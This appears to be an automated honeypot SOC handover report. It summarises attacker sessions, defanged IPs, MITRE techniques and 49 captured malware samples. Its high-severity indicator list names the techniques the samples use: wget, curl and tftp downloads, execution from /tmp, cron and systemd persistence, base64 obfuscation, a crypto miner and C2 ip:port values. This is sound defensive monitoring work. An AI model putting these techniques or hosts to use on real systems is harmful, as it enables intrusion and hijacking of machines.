**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-09 00:37:07` | `cowrie.session.connect` |
| `2026-11-09 00:37:08` | `cowrie.client.version` |
| `2026-11-09 00:37:08` | `cowrie.client.kex` |
| `2026-11-09 00:37:15` | `cowrie.login.success` |
| `2026-11-09 00:37:16` | `cowrie.client.size` |
| `2026-11-09 00:37:16` | `cowrie.session.params` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| `2026-11-09 00:37:16` | `cowrie.command.input` |
| … | _52 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (28) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-c1d911a68d49 | HIGH | `92.118.39[.]14` | 2026-11-09 00:39 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ff9e536ef03f | HIGH | `92.118.39[.]14` | 2026-11-09 00:40 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9bc04aa1a69f | HIGH | `92.118.39[.]14` | 2026-11-09 00:43 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fd73debfdaa9 | HIGH | `92.118.39[.]14` | 2026-11-09 00:44 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-fc95f51ed80f | HIGH | `92.118.39[.]14` | 2026-11-09 00:46 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-554a87a10e78 | HIGH | `92.118.39[.]14` | 2026-11-09 00:50 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0bc1f56e54d5 | HIGH | `92.118.39[.]14` | 2026-11-09 00:52 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-1689403edcf2 | HIGH | `92.118.39[.]14` | 2026-11-09 00:53 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-827521f47883 | HIGH | `92.118.39[.]14` | 2026-11-09 00:55 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-016e2861d698 | HIGH | `92.118.39[.]14` | 2026-11-09 00:58 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-19181c39e362 | HIGH | `92.118.39[.]14` | 2026-11-09 00:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2778f23d4b34 | HIGH | `14.103.118[.]136` | 2026-11-09 01:02 | Y | 10 | 1 | `T1021.004 · T1059.004 · T1078` |
| IR-112481f6af14 | HIGH | `121.229.9[.]97` | 2026-11-09 01:39 | Y | 19 | 2 | `T1021.004 · T1053.003 · T1057` |
| IR-d68fdb8b7249 | HIGH | `121.229.9[.]97` | 2026-11-09 01:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2fd213d97350 | HIGH | `121.229.9[.]97` | 2026-11-09 01:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dcbabd9ba598 | HIGH | `43.139.30[.]228` | 2026-11-09 01:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-84d7b0496cec | HIGH | `43.139.30[.]228` | 2026-11-09 01:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aab6175fc769 | HIGH | `193.32.162[.]15` | 2026-11-09 01:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-845575a09c4d | HIGH | `109.160.32[.]155` | 2026-11-09 02:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-238de716b02e | HIGH | `176.53.159[.]196` | 2026-11-09 02:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-81a92ab9e9b9 | HIGH | `121.229.9[.]97` | 2026-11-09 02:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a116ad23559a | HIGH | `193.32.162[.]15` | 2026-11-09 02:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6887bb42d721 | HIGH | `35.210.205[.]1` | 2026-11-09 02:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c4786dbb5f69 | HIGH | `2.57.122[.]150` | 2026-11-09 02:48 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5a0f8c416af9 | HIGH | `2.57.122[.]150` | 2026-11-09 02:50 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a38853a9828f | HIGH | `2.57.122[.]150` | 2026-11-09 02:52 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-43938ec09889 | HIGH | `109.160.32[.]155` | 2026-11-09 02:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0326f2807ceb | MEDIUM | `92.118.39[.]14` | 2026-11-09 00:01 | N | 2 | 0 | `T1059.004 · T1105 · T1222.002` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `121.229.9[.]97` | **2** | 2026-11-09 01:08 | 2026-11-09 02:02 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.32.162[.]15` | **2** | 2026-11-09 01:57 | 2026-11-09 02:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]155` | 1 | 2026-11-09 02:02 | 2026-11-09 02:02 | 8s | 0 | `T1592` | 🟢 LOW |
| `150.95.29[.]24` | 1 | 2026-11-09 01:26 | 2026-11-09 01:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-09 00:54 | 2026-11-09 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]180` | 1 | 2026-11-09 01:26 | 2026-11-09 01:26 | 2s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | 1 | 2026-11-09 02:42 | 2026-11-09 02:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.205[.]1` | 1 | 2026-11-09 02:41 | 2026-11-09 02:41 | 3s | 0 | `T1592` | 🟢 LOW |
| `35.210.210[.]121` | 1 | 2026-11-09 02:47 | 2026-11-09 02:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-09 01:05 | 2026-11-09 01:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.230.181[.]177` | 1 | 2026-11-09 00:43 | 2026-11-09 00:43 | 32s | 0 | `T1592` | 🟢 LOW |
| `47.164.108[.]214` | 1 | 2026-11-09 02:06 | 2026-11-09 02:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `49.79.167[.]210` | 1 | 2026-11-09 02:42 | 2026-11-09 02:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `54.145.62[.]66` | 1 | 2026-11-09 01:23 | 2026-11-09 01:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `57.154.209[.]64` | 1 | 2026-11-09 02:38 | 2026-11-09 02:38 | 9s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-09 02:12 | 2026-11-09 02:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | 1 | 2026-11-09 02:33 | 2026-11-09 02:33 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]198` | 1 | 2026-11-09 02:34 | 2026-11-09 02:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]197` | 1 | 2026-11-09 00:35 | 2026-11-09 00:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]228` | 1 | 2026-11-09 02:33 | 2026-11-09 02:34 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.6.232[.]29` | 1 | 2026-11-09 02:26 | 2026-11-09 02:26 | 8s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]3` | 1 | 2026-11-09 01:29 | 2026-11-09 01:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-09 01:48 | 2026-11-09 01:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `79.124.62[.]10` | 1 | 2026-11-09 02:45 | 2026-11-09 02:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | 1 | 2026-11-09 00:15 | 2026-11-09 00:15 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `18.116.101[.]220` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `2.57.122[.]150` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `45.230.181[.]177` | BR | MR NETWORKS - INTERNET BANDA LARGA LTDA | **100** ⚠️ | 0 |
| `195.96.139[.]180` | GB | Driftnet Ltd | **100** ⚠️ | 11 |
| `150.95.29[.]24` | TH | ZCOM THAI | **100** ⚠️ | 50 |
| `35.210.205[.]1` | BE | Google LLC | **100** ⚠️ | 0 |
| `66.132.172[.]135` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `49.79.167[.]210` | CN | CHINANET jiangsu province network | **100** ⚠️ | 0 |
| `193.32.162[.]15` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 65 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 59 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 38 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 34 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 31 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 9 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 94 cases |
| Tool 34  | Credential Extractor        | ✅ 751 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 18 fingerprints |
| Tool 36  | Command Clustering          | ✅ 38 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 45 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (14.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 22 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 25 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-09T03:33:06Z_
